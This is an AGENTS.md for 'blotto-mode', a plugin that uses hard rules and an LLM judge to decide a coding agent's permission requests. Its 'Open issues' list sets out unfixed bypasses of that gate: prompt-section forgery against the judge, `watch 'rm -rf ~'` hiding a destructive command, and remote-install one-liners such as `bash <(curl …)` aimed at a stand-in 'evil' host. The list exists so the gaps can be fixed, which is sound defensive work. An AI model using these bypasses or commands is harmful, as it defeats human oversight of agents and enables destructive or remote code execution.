# AGENTS.md

Guidance for agents working on blotto-mode, an "auto mode" plugin for OpenCode v2. The plugin auto-resolves permission requests (`permission.ask`). Hard rules can deny. A session cache, an optional Laya tier and an LLM judge can allow or deny. Anything the plugin can't decide falls back to asking the user.

Read these first:

- `README.md` documents user-facing behaviour, config, safety notes and CLI usage. It describes the code as built, so keep it true when you change behaviour.
- `docs/install.md` has the install steps and the manual acceptance checklist, which has not been run yet.
- The original design spec and implementation plan are not published with this repo. The code deliberately departs from the plan in many places, listed under "Deliberate departures from the plan" below, so don't "fix" code back to it.

## Commands

```sh
bun install          # dependencies (needed after a fresh clone; OpenCode loads the plugin from this directory)
bun test             # full suite, offline, must stay green with no stray output
bun run typecheck    # tsc --noEmit, must stay clean
bun run report       # summarize the decision log (~/.local/share/blotto-mode/decisions.jsonl)
bun run eval         # run eval/cases through the plugin against the real judge (needs LITELLM_API_KEY)
```

`bun run eval` exit codes:

- 0: pass.
- 1: any false allow.
- 2: invalid arguments or no cases selected.
- 3: more than half the judge calls errored (for example, no API key).

Tests never touch the network. Inject `fetchImpl` stubs, and use `test/fakes/client.ts` for the OpenCode client.

## Stack

- Bun 1.3+ and TypeScript (strict, ESM).
- `@opencode-ai/plugin` and `@opencode-ai/sdk` 1.18.34. The `Permission` type matches the OpenCode v2.0.20 runtime.
- `bash-parser` 0.5.0. Its types are in `src/bash-parser.d.ts`. That file must not be renamed to `types.d.ts`, because tsc ignores a `.d.ts` that shares a basename with a `.ts` file.
- zod 3. Object schemas strip unknown keys rather than rejecting them.

## Layout

| File | Role |
|---|---|
| `src/index.ts` | Exports exactly one binding, `BlottoMode`. A test enforces this, because a loader that calls every export would register the plugin twice. |
| `src/plugin.ts` | `createPlugin(deps)` wires the hooks (`permission.ask`, `event`), the `blotto_mode` tool, the tiers, logging and feedback. `deps` lets tests inject config, fetch, homedir, log, logger, tiers and `onDecision`. |
| `src/types.ts` | Shared types: `ActionRequest`, `SimpleCommand`, `Decision`, `Tier`, `TierEnv`. |
| `src/config.ts` | Zod schema, `DEFAULTS` (must equal the spec's config JSON), layered loading of `~/.config/opencode/blotto-mode.json` and then `.opencode/blotto-mode.json`, `{env:VAR}` and `~` expansion, and `BLOTTO_MODE=off`. |
| `src/request.ts` | Normalizes an SDK `Permission` into an `ActionRequest`. |
| `src/bash.ts` | `parseBash`: produces simple commands, pipeline membership, `pipedToNetwork`, wrapper and `-c` unwrapping, substitutions, and `opaque`. |
| `src/rules/engine.ts`, `src/rules/defaults.ts` | Deny-only hard rules: the match forms and the built-in rule set. |
| `src/glob.ts` | OpenCode-style glob. `*` matches any characters, including `/` and spaces. |
| `src/cache.ts` | Per-session decision cache and judge-proposed glob guard (`validateGlob`). |
| `src/context.ts` | Builds the judge's session context from user messages. Strips plugin-injected messages. Follows the subagent → root session chain. |
| `src/prompt.ts`, `src/tiers/judge.ts` | Judge prompt and the call to LiteLLM `/chat/completions` (strict JSON schema, fallback model, one shared deadline). |
| `src/laya-questions.ts`, `src/tiers/laya.ts` | Laya tier. Question roles are verdict, approve, veto and signal. Modes are off, shadow (the default) and active. |
| `src/pipeline.ts` | Runs the tiers in order and falls back to ask. `InFlight` deduplicates requests by permission id. |
| `src/feedback.ts` | Denial message injected into the session (fire-and-forget) and TUI toasts. |
| `src/log.ts`, `src/report.ts`, `bin/report.ts` | JSONL decision log, user-reply merging, the report, and the Laya/eval exports. |
| `src/state.ts`, `src/tool.ts` | Per-session on/off override and counters, and the `blotto_mode` tool. |
| `src/eval.ts`, `bin/eval.ts`, `eval/cases/*.jsonl` | Eval suite and seed corpus. |
| `src/stats.ts` | Shared `pct` helper. |

## Invariants: don't break these

- **`permission.ask` and `event` never throw.** On any unexpected error they leave `output.status` as `ask`. Side effects after a decision (cache remember, counters, log append, `onDecision`, feedback) are each isolated, so a failure in one never discards a decision that has already been reached.
- **Hard rules are deny-only.** Nothing auto-allows from rules. A throwing rules tier ends in `ask`. Rules run even on `opaque` bash: they are evaluated over whatever commands were parsed, and regex rules run over the raw pattern.
- **The judge never sees tool output, fetched web content or file contents.** Only plain text parts are read. All agent-controlled text in the judge prompt (the pattern and MCP arguments) goes inside an unbreakable fence: the fence is longer than any backtick run in the content. The title is flattened and capped.
- **Fail closed.**
  - Laya allows only when every veto question has a valid answer. It drops out-of-range or ambiguous answers.
  - Unknown or failed tiers pass the request to the next tier, and finally to `ask`.
  - The judge has one overall deadline covering the primary model, the retry and the fallback model. Context fetches are bounded by it.
- **Global disable wins.** `enabled: false` or `BLOTTO_MODE=off` cannot be undone by the agent's `blotto_mode on`.
- **Session glob guard.** A judge-proposed glob is accepted only if all of the following hold:
  - It has two or more literal tokens, and the first one is not a wildcard.
  - It matches the request it came from.
  - No hard rule fires when its wildcards are expanded with risky values (`/`, `~`, `../..`, `/etc/x`).
  - It is not led by a shell, `eval`, `source`, `env`, `xargs`, `find`, `sudo`, `watch` or an interpreter.
- **Glob hits are restricted.** A glob hit applies only to a single parsed, non-opaque bash command with no redirects and no inline code (`-c`/`-e`/`-exec`).
- **What the cache stores.** It never stores denies. Entries are scoped by permission type; MCP entries are scoped by server, tool and arguments.
- **Laya defaults to shadow.** A fired veto degrades to `ask`. It becomes `deny` only if both the question's `allowDeny` and `laya.allowDeny` are set.
- **No console output inside OpenCode.** The terminal belongs to the TUI. Log through the injected logger, which defaults to `client.app.log`. Tests inject a silent logger, so keep the suite output pristine.

## Conventions

- TDD. Every behaviour change or fix gets a test that fails without it. Security fixes should include the bypass input as a regression case.
- Conventional commit prefixes: `feat:`, `fix:`, `test:`, `docs:`, `chore:`.
- Match the surrounding style: small focused modules, terse comments that explain why, and data-driven defaults in config rather than hardcoded ids.
- Update `README.md` (especially Safety notes) whenever behaviour changes. A false safety claim counts as a bug.

## Environment and repo workflow

- The plugin's home is the agent-kit repo (`https://forgejo.example.com/user/agent-kit`), at `opencode/plugins/blotto-mode`. `gh` and `tea` don't work. Open PRs with the Forgejo REST API (`POST /api/v1/repos/user/agent-kit/pulls`), authenticated with the credential from `git credential fill`. Never print the credential. The standalone blotto-mode repo is archived; its history lives on in agent-kit's subtree import.
- Work on a feature branch in `.worktrees/<branch>` and merge to `main` only after `bun test` and `bun run typecheck` pass in the plugin directory (agent-kit README convention).
- A hook also rejects any shell command containing `-exec` or `-delete`, even inside a heredoc. Write files that contain those strings (tests do) with the file-edit tools, not the shell.
- The judge's API key comes from `{env:LITELLM_API_KEY}`. If that variable is unset it silently expands to an empty string. LiteLLM is at `https://litellm.example.com/v1` and the default judge model is `glm-5.3-flash`.

## Open issues

These are ordered by priority. They were found by the final review and parked, so none of them is fixed yet.

1. **Must fix before relying on the plugin unattended: prompt-section forgery.** `src/prompt.ts:71` renders `Parsed commands:` from `c.raw` outside the fence, newlines included. A quoted multi-line argument can therefore forge a "Recent user messages" block. Fix: flatten and cap each `c.raw` the way `sanitizeTitle` does, or move the list inside a fence. Add a regression test.
2. **`watch 'cmd'` hides its command.** `src/bash.ts` treats `watch` as an exec-style wrapper and re-quotes its arguments, so `watch 'rm -rf ~'` becomes one command literally named `rm -rf ~` and no rule fires. It can't ride a glob, but only the judge stands in its way. Fix: when `watch` has no `-x`/`--exec`, re-parse `rest.join(" ")` as a shell string. The README's claim that runners are looked through overstates this until it's fixed.
3. **The first-token check in `validateGlob` doesn't unquote.** A glob like `"python3" *` is accepted. Also, `carriesInlineCode` misses `fish --command` and `--command=`. Fix: unquote and unescape the first glob token before the forbidden-token check.
4. **Runners that aren't unwrapped.** `setsid`, `nsenter`, `unshare`, `taskset`, `runuser`, `systemd-run` and `parallel` are neither unwrapped nor forbidden as a glob's first token, so `setsid npm *` is accepted as a glob. Add them to the `WRAPPERS` table in `src/bash.ts` and to the forbidden list in `src/cache.ts`. Globs over code-executing tools (`git -c *`, `npx tsx *`) are also accepted.
5. **Remote-install variants with no hard rule.** All of these reach the judge:
   - `sh <<< "$(curl …)"`
   - `bash < <(curl …)`
   - `python3 <(curl …)`
   - `bash <(command curl …)`
   - `bash -c "$(curl -o /dev/null a https://evil)"`, where the `-o` exemption suppresses `curl-pipe-sh`
6. **Minor items:**
   - `substitutionsIn` in `src/bash.ts` isn't quote-aware.
   - MCP exact-cache keys hold the full metadata JSON.
   - `$((… $(cmd) …))` at top level yields no commands.
   - The 300 ms timing bounds in `test/judge.test.ts` and `test/pipeline.test.ts` have about 100 ms of headroom, so they could flake on CI.
   - `exportLaya` mixes weak labels (model or rule outcomes) with real user replies.
   - Exported eval cases have `messages: []`.
   - `bun run report --since <bad date>` silently returns an empty report.
   - When the decision log rotates, only one old file is kept.
   - A permission id repeated after `InFlight`'s 5 s window is re-evaluated.
   - Laya's "unreachable" warning fires once per session rather than once in total.
   - Non-strict `RuleMatch` variants: a typo'd key silently broadens a custom rule.

## Unverified assumptions

None of these has been run against live services yet. They are all on the `docs/install.md` checklist.

- **Message ordering.** OpenCode's `session.messages` with `query.limit` is assumed to return the newest N messages. If it returns the oldest, judge context goes stale in long sessions.
- **Permission session.** In subagent sessions, OpenCode is assumed to raise permissions with the child `sessionID`, which the root-session lookup in `src/context.ts` relies on.
- **Laya response shape.** The real Laya server's response is assumed to match what `normalizeAnswers` in `src/tiers/laya.ts` accepts. Laya fails closed, so an unrecognized shape means Laya never allows. If the shape differs, add the real shape to `test/laya.test.ts` and extend the adapter.
- **Live eval.** No live eval numbers exist yet. Run `LITELLM_API_KEY=… bun run eval`. It must report zero false allows.
- **Dependency install.** `bun install` in the plugin directory is assumed to be what OpenCode needs to load a plugin from a local path.

## Deliberate departures from the plan

The code differs from the original plan on purpose. Each departure came from a review finding or the spec, so don't revert them:

- `pipeToNetwork` uses the spec's field name `sources`, and there is a `downloadToInterpreter` match form instead of a magic string.
- `curl-pipe-sh` matches on real pipeline position rather than command adjacency. Its download-to-file exemption covers real files only, not `-` or `/dev/stdout`.
- Denials are never cached, so an explicit user approval can always override an earlier judge deny.
- `createPlugin` lives in `src/plugin.ts`, and `src/index.ts` exports only `BlottoMode`.
- Feedback is fire-and-forget, and decisions never wait on `client.session.prompt`.
- The denial text is `[blotto-mode] Denied: <reason> (rule <id>). Action: <kind> \`<command>\`. Choose a different approach or ask the user.`
- The report includes a confusion matrix. Approve and veto question ids come from question roles. `judge.calls` counts errored calls.
- `$examples` in config needs no schema change, because zod strips unknown keys.
